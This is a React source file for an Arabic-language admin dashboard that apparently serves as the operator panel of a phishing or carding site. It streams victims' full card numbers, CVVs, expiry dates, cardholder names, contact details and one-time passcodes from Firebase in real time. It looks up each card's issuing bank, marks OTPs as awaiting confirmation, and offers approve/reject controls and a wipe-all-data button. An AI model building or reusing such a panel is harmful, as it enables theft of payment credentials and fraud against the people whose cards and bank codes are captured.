import { useState, useEffect } from "react";
import {
  RefreshCw,
  LogOut,
  CreditCard,
  User,
  Clock,
  MapPin,
  Phone,
  Mail,
  Check,
  X,
  Inbox,
  Circle,
  EyeOff,
  Eye,
  Shield,
  Wifi,
  Building2,
  Globe,
  Banknote,
  Activity,
  Users,
  AlertCircle,
  ChevronRight,
  Trash2,
} from "lucide-react";
import {
  subscribeToVisitors,
  subscribeToFormSubmissions,
  getOnlineVisitorsCount,
  deleteAllData,
  VisitorData,
  FormSubmission,
} from "@/lib/firebase";
import { useAuth } from "@/context/AuthContext";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";

interface CombinedData {
  visitorId: string;
  country: string;
  city: string;
  isOnline: boolean;
  currentPage: string;
  lastSeen: any;
  buyerInfo: Record<string, any> | null;
  paymentInfo: Record<string, any> | null;
  paymentSuccess: boolean;
  code: string;
}

interface BinInfo {
  scheme: string;
  type: string;
  brand: string;
  bank: {
    name: string;
    url?: string;
    phone?: string;
    city?: string;
  };
  country: {
    name: string;
    emoji?: string;
    currency?: string;
    alpha2?: string;
  };
}

const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
  try {
    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
    if (bin.length < 6) return null;

    const response = await fetch("/api/bin-lookup", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ bin }),
    });

    if (!response.ok) return null;
    const data = await response.json();

    if (data.BIN) {
      return {
        scheme: data.BIN.scheme || "",
        type: data.BIN.type || "",
        brand: data.BIN.brand || "",
        bank: {
          name: data.BIN.issuer?.name || "",
          url: data.BIN.issuer?.website || "",
          phone: data.BIN.issuer?.phone || "",
          city: "",
        },
        country: {
          name: data.BIN.country?.country || "",
          emoji: "",
          currency: data.BIN.currency || "",
          alpha2: data.BIN.country?.alpha2 || "",
        },
      };
    }
    return null;
  } catch (error) {
    console.error("BIN lookup failed:", error);
    return null;
  }
};

function getCountryFlag(countryCode: string): string {
  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

const countryNamesArabic: Record<string, string> = {
  "United States": "الولايات المتحدة",
  "United Kingdom": "المملكة المتحدة",
  "Saudi Arabia": "المملكة العربية السعودية",
  "United Arab Emirates": "الإمارات العربية المتحدة",
  Qatar: "قطر",
  Kuwait: "الكويت",
  Bahrain: "البحرين",
  Oman: "عُمان",
  Egypt: "مصر",
  Jordan: "الأردن",
  Lebanon: "لبنان",
  Iraq: "العراق",
  Syria: "سوريا",
  Palestine: "فلسطين",
  Morocco: "المغرب",
  Algeria: "الجزائر",
  Tunisia: "تونس",
  Libya: "ليبيا",
  Sudan: "السودان",
  Yemen: "اليمن",
  Germany: "ألمانيا",
  France: "فرنسا",
  Italy: "إيطاليا",
  Spain: "إسبانيا",
  Netherlands: "هولندا",
  Turkey: "تركيا",
  Russia: "روسيا",
  China: "الصين",
  Japan: "اليابان",
  India: "الهند",
  Pakistan: "باكستان",
  Indonesia: "إندونيسيا",
  Malaysia: "ماليزيا",
  Canada: "كندا",
  Brazil: "البرازيل",
  Australia: "أستراليا",
};

function translateCountryName(englishName: string): string {
  return countryNamesArabic[englishName] || englishName;
}

function PremiumCreditCard({
  paymentInfo,
  binInfo,
}: {
  paymentInfo: Record<string, any>;
  binInfo: any;
}) {
  const cardNumber = paymentInfo.cardLast4 || "";
  const formattedNumber = cardNumber
    .replace(/\s/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();

  const getCardGradient = () => {
    const scheme = binInfo?.scheme?.toLowerCase();
    if (scheme === "visa") return "from-[#1a1f71] via-[#2557d6] to-[#1a1f71]";
    if (scheme === "mastercard") return "from-[#cc2131] via-[#eb001b] to-[#f79e1b]";
    if (scheme === "amex") return "from-[#006fcf] via-[#00aeef] to-[#006fcf]";
    return "from-slate-700 via-slate-800 to-slate-900";
  };

  const getCardLogo = () => {
    const scheme = binInfo?.scheme?.toLowerCase();
    if (scheme === "visa") {
      return <div className="text-white font-bold text-xl italic tracking-wider">VISA</div>;
    }
    if (scheme === "mastercard") {
      return (
        <div className="flex items-center -space-x-2">
          <div className="w-7 h-7 bg-red-500 rounded-full opacity-90"></div>
          <div className="w-7 h-7 bg-yellow-400 rounded-full opacity-90"></div>
        </div>
      );
    }
    if (scheme === "amex") {
      return <div className="text-white font-bold text-lg">AMEX</div>;
    }
    return <CreditCard className="w-7 h-7 text-white/60" />;
  };

  return (
    <div className="space-y-4">
      <div className={`w-full aspect-[1.6/1] max-w-sm rounded-2xl p-5 bg-gradient-to-br ${getCardGradient()} text-white shadow-2xl relative overflow-hidden`}>
        <div className="absolute top-0 right-0 w-40 h-40 bg-white/10 rounded-full blur-3xl -translate-y-1/2 translate-x-1/2"></div>
        <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/5 rounded-full blur-2xl translate-y-1/2 -translate-x-1/2"></div>

        <div className="flex items-start justify-between mb-6 relative z-10">
          <div className="flex items-center gap-3">
            <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-md shadow-inner">
              <div className="w-full h-full grid grid-cols-3 gap-0.5 p-1">
                {[...Array(6)].map((_, i) => (
                  <div key={i} className="bg-yellow-600/30 rounded-sm"></div>
                ))}
              </div>
            </div>
            <Wifi className="w-5 h-5 text-white/70 rotate-90" />
          </div>
          {getCardLogo()}
        </div>

        <div className="mb-5 relative z-10">
          <div className="font-mono text-xl tracking-[0.2em] font-medium drop-shadow-lg" dir="ltr">
            {formattedNumber || "•••• •••• •••• ••••"}
          </div>
        </div>

        <div className="flex items-end justify-between relative z-10">
          <div>
            <div className="text-white/50 text-[10px] uppercase tracking-wider mb-1">Card Holder</div>
            <div className="font-semibold text-sm uppercase tracking-wide truncate max-w-[140px]">
              {paymentInfo.cardholderName || "N/A"}
            </div>
          </div>
          <div className="flex gap-4 items-end">
            <div className="text-left" dir="ltr">
              <div className="text-white/50 text-[10px] uppercase tracking-wider mb-1">Valid Thru</div>
              <div className="font-mono text-sm font-medium">{paymentInfo.expiryDate || "MM/YY"}</div>
            </div>
            <div className="text-left" dir="ltr">
              <div className="text-white/50 text-[10px] uppercase tracking-wider mb-1">CVV</div>
              <div className="font-mono text-sm font-bold">{paymentInfo.cvv || "•••"}</div>
            </div>
          </div>
        </div>

        {binInfo && (
          <div className="flex items-center justify-between mt-4 pt-3 border-t border-white/20 relative z-10">
            <div className="flex items-center gap-2">
              <Badge variant="secondary" className="bg-white/20 text-white text-[10px] border-0">
                {binInfo.type || "CARD"}
              </Badge>
              {binInfo.brand && (
                <Badge variant="secondary" className="bg-white/10 text-white/80 text-[10px] border-0">
                  {binInfo.brand}
                </Badge>
              )}
            </div>
            {binInfo.country?.currency && (
              <Badge variant="secondary" className="bg-white/20 text-white text-[10px] border-0">
                {binInfo.country.currency}
              </Badge>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const { user, isLoading: authLoading, logout } = useAuth();
  const [visitors, setVisitors] = useState<VisitorData[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<FormSubmission[]>([]);
  const [onlineCount, setOnlineCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
  const [loadingBin, setLoadingBin] = useState(false);
  const [hiddenIds, setHiddenIds] = useState<Set<string>>(new Set());
  const [showHidden, setShowHidden] = useState(false);
  const [filter, setFilter] = useState<"all" | "online" | "withPayment" | "withBuyer" | "visitors">("all");
  const [isDeleting, setIsDeleting] = useState(false);
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);

  const handleDeleteAll = async () => {
    setIsDeleting(true);
    const result = await deleteAllData();
    setIsDeleting(false);
    setShowDeleteConfirm(false);
    if (result.success) {
      setSelectedData(null);
      setVisitors([]);
      setFormSubmissions([]);
    }
  };

  useEffect(() => {
    if (!authLoading && !user) {
    }
  }, [user, authLoading]);

  useEffect(() => {
    if (!user) return;

    const unsubVisitors = subscribeToVisitors((data) => {
      setVisitors(data);
      setIsLoading(false);
    });

    const unsubForms = subscribeToFormSubmissions((data) => {
      setFormSubmissions(data);
    });

    const unsubOnline = getOnlineVisitorsCount((count) => {
      setOnlineCount(count);
    });

    return () => {
      unsubVisitors();
      unsubForms();
      unsubOnline();
    };
  }, [user]);

  const formatTimeAgo = (timestamp: any) => {
    if (!timestamp?.toDate) return "";
    const date = timestamp.toDate();
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);

    if (minutes < 1) return "الآن";
    if (minutes < 60) return `${minutes}د`;
    if (hours < 24) return `${hours}س`;
    return `${Math.floor(diff / 86400000)}ي`;
  };

  const formatFullTime = (timestamp: any) => {
    if (!timestamp?.toDate) return "غير معروف";
    const date = timestamp.toDate();
    return date.toLocaleString("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const handleLogout = async () => {
    await logout();
  };

  const combinedData: CombinedData[] = visitors.map((visitor) => {
    const buyerSubmission = formSubmissions.find(
      (f) => f.visitorId === visitor.visitorId && f.formType === "buyer_details"
    );
    const paymentSubmission = formSubmissions.find(
      (f) => f.visitorId === visitor.visitorId && f.formType === "payment_attempt"
    );

    return {
      visitorId: visitor.visitorId,
      country: visitor.country || "Unknown",
      city: visitor.city || "",
      isOnline: visitor.isOnline || false,
      currentPage: visitor.currentPage || "الرئيسية",
      lastSeen: visitor.lastSeen,
      buyerInfo: buyerSubmission?.data || null,
      paymentInfo: paymentSubmission?.data || null,
      paymentSuccess: paymentSubmission?.success || false,
      code: paymentSubmission?.data?.otp || "",
    };
  });

  // Sort by date (newest first)
  const sortedData = [...combinedData].sort((a, b) => {
    const dateA = a.lastSeen?.toDate?.() || new Date(0);
    const dateB = b.lastSeen?.toDate?.() || new Date(0);
    return dateB.getTime() - dateA.getTime();
  });

  // Apply filters
  const filteredData = sortedData.filter((row) => {
    if (!showHidden && hiddenIds.has(row.visitorId)) return false;
    
    switch (filter) {
      case "online":
        return row.isOnline;
      case "withPayment":
        return row.paymentInfo;
      case "withBuyer":
        return row.buyerInfo;
      case "visitors":
        return true; // Show all visitors
      case "all":
      default:
        return row.paymentInfo || row.buyerInfo;
    }
  });

  const hiddenCount = combinedData.filter(
    (row) => row.paymentInfo && hiddenIds.has(row.visitorId)
  ).length;

  useEffect(() => {
    if (selectedData) {
      const updated = combinedData.find((d) => d.visitorId === selectedData.visitorId);
      if (updated && JSON.stringify(updated) !== JSON.stringify(selectedData)) {
        setSelectedData(updated);
      }
    }
  }, [combinedData, selectedData]);

  const handleHideEntry = (visitorId: string) => {
    setHiddenIds((prev) => {
      const newSet = new Set(prev);
      if (newSet.has(visitorId)) {
        newSet.delete(visitorId);
      } else {
        newSet.add(visitorId);
      }
      return newSet;
    });
    if (selectedData?.visitorId === visitorId && !showHidden) {
      setSelectedData(null);
    }
  };

  const handleSelectEntry = async (data: CombinedData) => {
    setSelectedData(data);
    setBinInfo(null);

    if (data.paymentInfo?.cardLast4) {
      setLoadingBin(true);
      const info = await lookupBin(data.paymentInfo.cardLast4);
      setBinInfo(info);
      setLoadingBin(false);
    }
  };

  if (authLoading || isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#8A1538] to-[#a91d47] flex items-center justify-center mx-auto mb-4 shadow-xl">
            <RefreshCw className="w-8 h-8 text-white animate-spin" />
          </div>
          <p className="text-slate-400 text-lg">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  if (!user) return null;

  return (
    <div className="h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex flex-col" dir="rtl">
      {/* Premium Header */}
      <header className="bg-slate-900/80 backdrop-blur-xl border-b border-white/10 px-6 py-4 flex items-center justify-between gap-4 shrink-0">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-[#8A1538] to-[#a91d47] flex items-center justify-center shadow-lg shadow-[#8A1538]/20">
            <Shield className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className="text-xl font-bold text-white">لوحة التحكم</h1>
            <p className="text-sm text-slate-400">إدارة المعاملات والمستخدمين</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          {/* Stats Cards */}
          <div className="hidden md:flex items-center gap-3">
            <div className="bg-white/5 backdrop-blur-sm rounded-xl px-4 py-2 border border-white/10">
              <div className="flex items-center gap-2">
                <Activity className="w-4 h-4 text-green-400" />
                <span className="text-xs text-slate-400">متصل</span>
                <span className="text-lg font-bold text-white">{onlineCount}</span>
              </div>
            </div>
            <div className="bg-white/5 backdrop-blur-sm rounded-xl px-4 py-2 border border-white/10">
              <div className="flex items-center gap-2">
                <Users className="w-4 h-4 text-blue-400" />
                <span className="text-xs text-slate-400">المعاملات</span>
                <span className="text-lg font-bold text-white">{filteredData.length}</span>
              </div>
            </div>
          </div>

          {hiddenCount > 0 && (
            <Button
              onClick={() => setShowHidden(!showHidden)}
              variant={showHidden ? "default" : "outline"}
              size="sm"
              className={showHidden ? "bg-[#8A1538] hover:bg-[#70102d]" : "border-white/20 text-slate-300 hover:bg-white/10"}
            >
              <EyeOff className="w-4 h-4 ml-1" />
              {hiddenCount}
            </Button>
          )}

          <Button
            onClick={() => setShowDeleteConfirm(true)}
            variant="destructive"
            size="sm"
            className="bg-red-600 hover:bg-red-700"
            data-testid="button-delete-all"
          >
            <Trash2 className="w-4 h-4 ml-1" />
            حذف الكل
          </Button>

          <Button
            onClick={handleLogout}
            variant="ghost"
            size="sm"
            className="text-slate-400 hover:text-white hover:bg-white/10"
          >
            <LogOut className="w-4 h-4" />
          </Button>
        </div>
      </header>

      {/* Delete Confirmation Modal */}
      {showDeleteConfirm && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-slate-800 rounded-2xl p-6 max-w-md w-full border border-white/10 shadow-2xl">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-12 h-12 rounded-xl bg-red-500/20 flex items-center justify-center">
                <Trash2 className="w-6 h-6 text-red-400" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white">حذف جميع البيانات</h3>
                <p className="text-sm text-slate-400">هل أنت متأكد؟</p>
              </div>
            </div>
            <p className="text-slate-300 mb-6">
              سيتم حذف جميع الزوار والمعاملات والبيانات المسجلة. هذا الإجراء لا يمكن التراجع عنه.
            </p>
            <div className="flex gap-3">
              <Button
                onClick={() => setShowDeleteConfirm(false)}
                variant="outline"
                className="flex-1 border-white/20 text-slate-300 hover:bg-white/10"
                disabled={isDeleting}
              >
                إلغاء
              </Button>
              <Button
                onClick={handleDeleteAll}
                variant="destructive"
                className="flex-1 bg-red-600 hover:bg-red-700"
                disabled={isDeleting}
              >
                {isDeleting ? (
                  <>
                    <RefreshCw className="w-4 h-4 ml-1 animate-spin" />
                    جاري الحذف...
                  </>
                ) : (
                  <>
                    <Trash2 className="w-4 h-4 ml-1" />
                    حذف الكل
                  </>
                )}
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className="flex-1 flex overflow-hidden">
        {/* Sidebar List */}
        <div className="w-80 bg-slate-900/50 backdrop-blur-sm border-l border-white/10 flex flex-col">
          <div className="p-4 border-b border-white/10">
            <h2 className="text-sm font-semibold text-slate-300 flex items-center gap-2 mb-3">
              <Inbox className="w-4 h-4" />
              المعاملات الواردة
            </h2>
            {/* Filters */}
            <div className="flex flex-wrap gap-1">
              <Button
                size="sm"
                variant={filter === "all" ? "default" : "ghost"}
                onClick={() => setFilter("all")}
                className={`text-xs h-7 ${filter === "all" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                الكل
              </Button>
              <Button
                size="sm"
                variant={filter === "visitors" ? "default" : "ghost"}
                onClick={() => setFilter("visitors")}
                className={`text-xs h-7 ${filter === "visitors" ? "bg-[#8A1538]" : "text-slate-400 hover:text-white"}`}
              >
                <Users className="w-3 h-3 ml-1" />
                الزوار
              </Button>
              <Button
                size="sm"
                variant={filter === "online" ? "default" : "ghost"}
                onClick={() => setFilter("online")}
                className={`text-xs h-7 ${filter === "online" ? "bg-green-600" : "text-slate-400 hover:text-white"}`}
              >
                <Circle className="w-2 h-2 ml-1 fill-current" />
                متصل
              </Button>
              <Button
                size="sm"
                variant={filter === "withPayment" ? "default" : "ghost"}
                onClick={() => setFilter("withPayment")}
                className={`text-xs h-7 ${filter === "withPayment" ? "bg-blue-600" : "text-slate-400 hover:text-white"}`}
              >
                <CreditCard className="w-3 h-3 ml-1" />
                دفع
              </Button>
              <Button
                size="sm"
                variant={filter === "withBuyer" ? "default" : "ghost"}
                onClick={() => setFilter("withBuyer")}
                className={`text-xs h-7 ${filter === "withBuyer" ? "bg-purple-600" : "text-slate-400 hover:text-white"}`}
              >
                <User className="w-3 h-3 ml-1" />
                بيانات
              </Button>
            </div>
          </div>
          <ScrollArea className="flex-1">
            <div className="p-2 space-y-1">
              {filteredData.length > 0 ? (
                filteredData.map((row) => (
                  <div
                    key={row.visitorId}
                    onClick={() => handleSelectEntry(row)}
                    className={`p-3 rounded-xl cursor-pointer transition-all duration-200 ${
                      selectedData?.visitorId === row.visitorId
                        ? "bg-gradient-to-r from-[#8A1538]/30 to-[#8A1538]/10 border border-[#8A1538]/50"
                        : "hover:bg-white/5 border border-transparent"
                    }`}
                    data-testid={`inbox-item-${row.visitorId}`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${
                        row.isOnline 
                          ? "bg-green-500/20 ring-2 ring-green-500/50" 
                          : "bg-slate-700/50"
                      }`}>
                        <User className={`w-5 h-5 ${row.isOnline ? "text-green-400" : "text-slate-500"}`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-2 mb-1">
                          <span className="font-semibold text-white truncate text-sm">
                            {row.paymentInfo?.cardholderName || "غير معروف"}
                          </span>
                          <span className="text-[11px] text-slate-500 shrink-0">
                            {formatTimeAgo(row.lastSeen)}
                          </span>
                        </div>
                        <div className="flex items-center gap-1 text-xs text-slate-400 mb-2">
                          <MapPin className="w-3 h-3" />
                          <span className="truncate">{row.country} {row.city && `• ${row.city}`}</span>
                        </div>
                        <div className="flex items-center gap-2 flex-wrap">
                          {row.code && (
                            <Badge className="bg-amber-500/20 text-amber-400 border-amber-500/30 text-[10px] font-mono">
                              OTP: {row.code}
                            </Badge>
                          )}
                          <Badge className={`text-[10px] ${
                            row.isOnline 
                              ? "bg-green-500/20 text-green-400 border-green-500/30" 
                              : "bg-slate-700/50 text-slate-500 border-slate-600/30"
                          }`}>
                            {row.isOnline ? "متصل" : "غير متصل"}
                          </Badge>
                        </div>
                      </div>
                      <ChevronRight className="w-4 h-4 text-slate-600 shrink-0" />
                    </div>
                  </div>
                ))
              ) : (
                <div className="p-8 text-center">
                  <div className="w-16 h-16 rounded-2xl bg-slate-800/50 flex items-center justify-center mx-auto mb-4">
                    <Inbox className="w-8 h-8 text-slate-600" />
                  </div>
                  <p className="text-slate-500">لا توجد معاملات</p>
                </div>
              )}
            </div>
          </ScrollArea>
        </div>

        {/* Main Content */}
        <div className="flex-1 flex flex-col overflow-hidden">
          {selectedData ? (
            <>
              {/* Detail Header */}
              <div className="bg-slate-900/50 backdrop-blur-sm border-b border-white/10 p-4 shrink-0">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-4">
                    <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${
                      selectedData.isOnline 
                        ? "bg-green-500/20 ring-2 ring-green-500/50" 
                        : "bg-slate-700/50"
                    }`}>
                      <User className={`w-6 h-6 ${selectedData.isOnline ? "text-green-400" : "text-slate-500"}`} />
                    </div>
                    <div>
                      <h2 className="font-bold text-white text-lg">
                        {selectedData.paymentInfo?.cardholderName || "غير معروف"}
                      </h2>
                      <div className="flex items-center gap-3 text-sm text-slate-400">
                        <span className="flex items-center gap-1">
                          <MapPin className="w-3.5 h-3.5" />
                          {selectedData.country} {selectedData.city && `• ${selectedData.city}`}
                        </span>
                        <span className="flex items-center gap-1">
                          <Clock className="w-3.5 h-3.5" />
                          {formatFullTime(selectedData.lastSeen)}
                        </span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <Button className="bg-green-600 hover:bg-green-700 text-white">
                      <Check className="w-4 h-4 ml-1" />
                      موافقة
                    </Button>
                    <Button variant="destructive">
                      <X className="w-4 h-4 ml-1" />
                      رفض
                    </Button>
                    <Button
                      variant="outline"
                      onClick={() => handleHideEntry(selectedData.visitorId)}
                      className="border-white/20 text-slate-300 hover:bg-white/10"
                    >
                      {hiddenIds.has(selectedData.visitorId) ? (
                        <><Eye className="w-4 h-4 ml-1" />إظهار</>
                      ) : (
                        <><EyeOff className="w-4 h-4 ml-1" />إخفاء</>
                      )}
                    </Button>
                  </div>
                </div>
              </div>

              <ScrollArea className="flex-1">
                <div className="p-6 space-y-6">
                  {/* OTP Alert */}
                  {selectedData.code && (
                    <div className="bg-gradient-to-r from-amber-500/20 to-orange-500/20 border border-amber-500/30 rounded-2xl p-5 flex items-center justify-between">
                      <div className="flex items-center gap-4">
                        <div className="w-14 h-14 rounded-xl bg-amber-500/30 flex items-center justify-center">
                          <AlertCircle className="w-7 h-7 text-amber-400" />
                        </div>
                        <div>
                          <p className="text-amber-300 text-sm font-medium mb-1">رمز التحقق OTP</p>
                          <p className="font-mono text-3xl font-bold text-white tracking-widest">{selectedData.code}</p>
                        </div>
                      </div>
                      <Badge className="bg-amber-500/30 text-amber-300 border-amber-500/50 text-sm px-4 py-2">
                        في انتظار التأكيد
                      </Badge>
                    </div>
                  )}

                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    {/* Credit Card Section */}
                    {selectedData.paymentInfo && (
                      <div className="bg-white/5 backdrop-blur-sm rounded-2xl border border-white/10 p-5">
                        <div className="flex items-center gap-2 mb-4">
                          <CreditCard className="w-5 h-5 text-[#8A1538]" />
                          <h3 className="font-semibold text-white">بطاقة الدفع</h3>
                        </div>

                        {loadingBin ? (
                          <div className="flex items-center justify-center py-12">
                            <RefreshCw className="w-6 h-6 text-slate-500 animate-spin" />
                          </div>
                        ) : (
                          <PremiumCreditCard paymentInfo={selectedData.paymentInfo} binInfo={binInfo} />
                        )}
                      </div>
                    )}

                    {/* Bank Info */}
                    {binInfo && (
                      <div className="bg-white/5 backdrop-blur-sm rounded-2xl border border-white/10 p-5">
                        <div className="flex items-center gap-2 mb-4">
                          <Building2 className="w-5 h-5 text-[#8A1538]" />
                          <h3 className="font-semibold text-white">معلومات البنك</h3>
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                          <div className="bg-slate-800/50 rounded-xl p-4">
                            <div className="flex items-center gap-2 mb-2">
                              {binInfo.country?.alpha2 && (
                                <span className="text-2xl">{getCountryFlag(binInfo.country.alpha2)}</span>
                              )}
                              <Globe className="w-4 h-4 text-slate-500" />
                            </div>
                            <p className="text-xs text-slate-500 mb-1">الدولة</p>
                            <p className="text-white font-medium">
                              {binInfo.country?.name ? translateCountryName(binInfo.country.name) : "غير معروف"}
                            </p>
                          </div>

                          <div className="bg-slate-800/50 rounded-xl p-4">
                            <Building2 className="w-5 h-5 text-slate-500 mb-2" />
                            <p className="text-xs text-slate-500 mb-1">البنك</p>
                            <p className="text-white font-medium truncate">{binInfo.bank?.name || "غير معروف"}</p>
                          </div>

                          <div className="bg-slate-800/50 rounded-xl p-4">
                            <CreditCard className="w-5 h-5 text-slate-500 mb-2" />
                            <p className="text-xs text-slate-500 mb-1">نوع البطاقة</p>
                            <p className="text-white font-medium">{binInfo.type || "غير معروف"}</p>
                          </div>

                          <div className="bg-slate-800/50 rounded-xl p-4">
                            <Banknote className="w-5 h-5 text-slate-500 mb-2" />
                            <p className="text-xs text-slate-500 mb-1">العملة</p>
                            <p className="text-white font-medium">{binInfo.country?.currency || "غير معروف"}</p>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Buyer Info */}
                    {selectedData.buyerInfo && (
                      <div className="bg-white/5 backdrop-blur-sm rounded-2xl border border-white/10 p-5 lg:col-span-2">
                        <div className="flex items-center gap-2 mb-4">
                          <User className="w-5 h-5 text-[#8A1538]" />
                          <h3 className="font-semibold text-white">معلومات المشتري</h3>
                        </div>

                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                          <div className="bg-slate-800/50 rounded-xl p-4">
                            <User className="w-5 h-5 text-slate-500 mb-2" />
                            <p className="text-xs text-slate-500 mb-1">الاسم الكامل</p>
                            <p className="text-white font-medium">
                              {selectedData.buyerInfo.firstName} {selectedData.buyerInfo.lastName}
                            </p>
                          </div>

                          {selectedData.buyerInfo.email && (
                            <div className="bg-slate-800/50 rounded-xl p-4">
                              <Mail className="w-5 h-5 text-slate-500 mb-2" />
                              <p className="text-xs text-slate-500 mb-1">البريد الإلكتروني</p>
                              <p className="text-white font-medium text-sm truncate">{selectedData.buyerInfo.email}</p>
                            </div>
                          )}

                          {selectedData.buyerInfo.phone && (
                            <div className="bg-slate-800/50 rounded-xl p-4">
                              <Phone className="w-5 h-5 text-slate-500 mb-2" />
                              <p className="text-xs text-slate-500 mb-1">رقم الهاتف</p>
                              <p className="text-white font-medium font-mono" dir="ltr">{selectedData.buyerInfo.phone}</p>
                            </div>
                          )}

                          {selectedData.buyerInfo.nationality && (
                            <div className="bg-slate-800/50 rounded-xl p-4">
                              <Globe className="w-5 h-5 text-slate-500 mb-2" />
                              <p className="text-xs text-slate-500 mb-1">الجنسية</p>
                              <p className="text-white font-medium">{selectedData.buyerInfo.nationality}</p>
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </ScrollArea>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center">
                <div className="w-24 h-24 rounded-3xl bg-slate-800/50 flex items-center justify-center mx-auto mb-6">
                  <Inbox className="w-12 h-12 text-slate-600" />
                </div>
                <h3 className="text-xl font-semibold text-slate-400 mb-2">اختر معاملة</h3>
                <p className="text-slate-600">اختر معاملة من القائمة لعرض التفاصيل</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
